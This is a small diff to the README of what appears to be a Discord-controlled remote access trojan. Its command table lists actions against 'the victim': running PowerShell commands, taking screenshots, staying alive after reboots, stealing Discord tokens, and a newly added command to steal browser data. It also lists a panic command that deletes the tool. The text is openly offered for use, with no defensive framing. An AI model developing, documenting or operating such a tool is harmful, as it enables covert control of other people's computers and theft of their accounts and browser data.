@@ -48,7 +48,8 @@ Use these in the victim's channel on Discord.
 | `!shell <command>`| Runs a PowerShell command.                    |
 | `!screen`         | Takes a pic of their screen.                  |
 | `!persistencia`   | Makes sure it stays alive after a reboot.     |
-| `!grab tokens`    | Steals Discord tokens.                        |
+| `!tokengrab`      | Steals Discord tokens.                        |
+| `!browser`        | Steals browsers data.                         |
 | `!exit`           | **PANIC BUTTON.** Deletes itself everywhere.  |
 
 ---
